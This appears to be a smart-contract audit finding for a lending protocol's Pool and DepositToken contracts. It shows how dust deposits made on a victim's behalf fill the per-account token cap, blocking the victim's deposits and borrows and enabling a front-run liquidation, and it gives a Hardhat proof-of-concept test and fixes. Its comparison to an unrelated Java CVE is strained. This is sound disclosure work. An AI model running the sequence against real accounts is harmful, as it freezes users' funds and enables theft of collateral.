### Title
Attacker can fill a victim's per-account token list to `MAX_TOKENS_PER_USER` via forced dust deposits/transfers, DoS-ing the victim's deposits and new borrows (partial denial of service) - ([File: contracts/Pool.sol])

### Summary
CVE-2021-35578 is an unauthenticated, remotely-triggered partial DoS: crafted input to the JSSE component degrades availability. The reachable Metronome analog is the `MAX_TOKENS_PER_USER` (30) cap enforced by `onlyIfAdditionWillNotReachMaxTokens` on `Pool.addToDepositTokensOfAccount` / `Pool.addToDebtTokensOfAccount`. Any unprivileged user can push dust `DepositToken` balances onto a victim's account-list until the cap is hit, after which every deposit of a new collateral type, every `transfer`/`transferFrom`/`seize` of a new msdTOKEN to the victim, and every first borrow (`DebtToken.issue` → `addToDebtTokensOfAccount`) reverts with `UserReachedMaxTokens`. This is an attacker-supplied-input → availability-impact bug in the same class.

### Finding Description
`Pool` tracks each account's held deposit/debt tokens in `MappedEnumerableSet` lists and reverts additions once `debtTokensOfAccount.length + depositTokensOfAccount.length >= 30` [1](#0-0) . The cap is enforced inside the token-facing hooks [2](#0-1) .

`DepositToken._mint` calls `pool.addToDepositTokensOfAccount(account_)` whenever the recipient's balance moves from 0 [3](#0-2) , and `deposit(amount_, onBehalfOf_)` lets anyone mint to an arbitrary `onBehalfOf_` address [4](#0-3) . `DepositToken._transfer` does the same for the recipient [5](#0-4) . Because `addToDepositTokensOfAccount`/`addToDebtTokensOfAccount` take no consent from `account_`, the attacker chooses the victim.

Attack: for each of the up-to-30 listed deposit tokens, the attacker calls `depositToken.deposit(dustAmount, victim)` (or `deposit` to self then `transfer(victim, 1)`), filling `depositTokensOfAccount[victim]` to 30. From then on:
- `victim` depositing any new collateral type reverts (`_mint` → `addToDepositTokensOfAccount` → `UserReachedMaxTokens`).
- `victim` borrowing any synthetic they haven't borrowed before reverts (`DebtToken.issue`/`mint` → `addToDebtTokensOfAccount` → same revert).
- Any `transfer`/`transferFrom`/`seize` sending a new msdTOKEN to `victim` reverts.

### Impact Explanation
This is a temporary freeze of core protocol functions for the targeted account — the direct analog of the CVE's "partial DOS, availability impacts only". The strongest consequence: when `victim`'s position drifts toward unhealthy (`debtPositionOf` → `_isHealthy` false), the victim's only remedies are depositing collateral or repaying debt. If their remaining collateral types can't cover the position, they must deposit a *new* collateral type — which the attacker front-runs and blocks by filling the last free slots. The attacker then calls `Pool.liquidate` in the same block and seizes collateral with the liquidation bonus, turning the liveness failure into direct theft of the victim's excess collateral. Even without liquidation, the victim is temporarily barred from depositing/borrowing until they manually `transfer` dust entries away — a griefing loop the attacker can repeat.

### Likelihood Explanation
- Fully unprivileged: `deposit` and `transfer` are public; `onBehalfOf_`/recipient is attacker-chosen; no governor/keeper/oracle involvement.
- Cost: dust amounts of each whitelisted underlying (≤30 small ERC20 transfers). No capital at risk.
- Constraints: requires the victim to have near-30 existing entries OR the pool to list enough deposit tokens for the attacker to occupy the remaining slots; impact beyond temporary DoS (liquidation profit) requires the victim's position to be liquidatable and only rescuable via a new collateral type. This makes profitability situational, matching Medium severity.

### Recommendation
- Enforce the `MAX_TOKENS_PER_USER` check only for actions initiated by the account itself (e.g., check inside `deposit`/`issue` against `_msgSender()`/`onBehalfOf_` distinction), or allow anyone to add tokens to an account's list beyond the cap while only capping the reads.
- Alternatively, let `DepositToken` skip `addToDepositTokensOfAccount` (or accept-and-ignore the revert) when the recipient didn't initiate the call, e.g., via a `try/catch` on `pool.addToDepositTokensOfAccount(recipient_)` for transfer-driven additions.

### Proof of Concept
Hardhat sketch (adapted to repo's test setup; verified revert path: `deposit` → `_mint` → `pool.addToDepositTokensOfAccount` → `UserReachedMaxTokens`):

```ts
// test/griefing-max-tokens.test.ts (Hardhat, repo test style)
it('dust-fills victim token list and DoSes victim deposits', async () => {
  // given: pool with N deposit tokens registered; victim has some open position
  const max = (await pool.MAX_TOKENS_PER_USER()).toNumber(); // 30
  const freeSlots = max - (await pool.getDepositTokensOfAccount(victim.address)).length
                    - (await pool.getDebtTokensOfAccount(victim.address)).length;

  // attacker dust-deposits `freeSlots` distinct deposit tokens on behalf of victim
  for (let i = 0; i < freeSlots; ++i) {
    const dt = depositTokens[i];                    // whitelisted DepositToken
    const underlying = await dt.underlying();
    await IERC20__factory.connect(underlying, attacker).approve(dt.address, 2);
    await dt.connect(attacker).deposit(2, victim.address); // pushes victim slot
  }

  // victim's list is now full
  expect((await pool.getDepositTokensOfAccount(victim.address)).length
       + (await pool.getDebtTokensOfAccount(victim.address)).length).eq(max);

  // when: victim tries to deposit a NEW collateral type -> reverts
  await expect(
    newDepositToken.connect(victim).deposit(parseEther('1'), victim.address)
  ).revertedWithCustomError(pool, 'UserReachedMaxTokens');

  // and: first-time borrow of a new synthetic also reverts (addToDebtTokensOfAccount)
  // and: incoming transfer of a new msdTOKEN to victim reverts
  await expect(
    otherDepositToken.connect(attacker).transfer(victim.address, 1)
  ).revertedWithCustomError(pool, 'UserReachedMaxTokens');
});
```

Note: exact revert string/PoC harness depends on repo fixtures; the code path (`Pool.sol:144`, `Pool.sol:216-219`, `DepositToken.sol:486-487`) is confirmed in source.

### Citations

**File:** contracts/Pool.sol (L143-148)
```text
    modifier onlyIfAdditionWillNotReachMaxTokens(address account_) {
        if (debtTokensOfAccount.length(account_) + depositTokensOfAccount.length(account_) >= MAX_TOKENS_PER_USER) {
            revert UserReachedMaxTokens();
        }
        _;
    }
```

**File:** contracts/Pool.sol (L204-220)
```text
    function addToDebtTokensOfAccount(address account_) external onlyIfAdditionWillNotReachMaxTokens(account_) {
        address _debtToken = _msgSender();
        _revertIfSenderIsNotDebtToken(_debtToken);
        if (!debtTokensOfAccount.add(account_, _debtToken)) revert DebtTokenAlreadyExists();
    }

    /**
     * @notice Add a deposit token to the per-account list
     * @dev This function is called from `DepositToken` when user's balance changes from `0`
     * @dev The caller should ensure to not pass `address(0)` as `_account`
     * @param account_ The account address
     */
    function addToDepositTokensOfAccount(address account_) external onlyIfAdditionWillNotReachMaxTokens(account_) {
        address _depositToken = _msgSender();
        _revertIfSenderIsNotDepositToken(_depositToken);
        if (!depositTokensOfAccount.add(account_, _depositToken)) revert DepositTokenAlreadyExists();
    }
```

**File:** contracts/DepositToken.sol (L211-236)
```text
    function deposit(
        uint256 amount_,
        address onBehalfOf_
    ) external override whenNotPaused nonReentrant onlyIfDepositTokenExists returns (uint256 _deposited, uint256 _fee) {
        if (amount_ == 0) revert AmountIsZero();
        if (onBehalfOf_ == address(0)) revert BeneficiaryIsNull();

        IPool _pool = pool;
        IERC20 _underlying = underlying;
        address _msgSender = _msgSender();
        address _treasury = address(_pool.treasury());

        if (_msgSender == _treasury) revert TreasuryCanNotDeposit();

        uint256 _balanceBefore = _underlying.balanceOf(_treasury);
        _underlying.safeTransferFrom(_msgSender, _treasury, amount_);
        amount_ = _underlying.balanceOf(_treasury) - _balanceBefore;

        (_deposited, _fee) = quoteDepositOut(amount_);
        if (_fee > 0) {
            _mint(_pool.feeCollector(), _fee);
        }

        _mint(onBehalfOf_, _deposited);

        emit CollateralDeposited(_msgSender, onBehalfOf_, amount_, _deposited, _fee);
```

**File:** contracts/DepositToken.sol (L485-488)
```text
        // Add this token to the deposit tokens list if the recipient is receiving it for the 1st time
        if (_balanceBefore == 0 && amount_ > 0) {
            pool.addToDepositTokensOfAccount(account_);
        }
```

**File:** contracts/DepositToken.sol (L517-525)
```text
        // Add this token to the deposit tokens list if the recipient is receiving it for the 1st time
        if (_recipientBalanceBefore == 0 && amount_ > 0) {
            pool.addToDepositTokensOfAccount(recipient_);
        }

        // Remove this token from the deposit tokens list if the sender's balance goes to zero
        if (amount_ > 0 && balanceOf[sender_] == 0) {
            pool.removeFromDepositTokensOfAccount(sender_);
        }
```
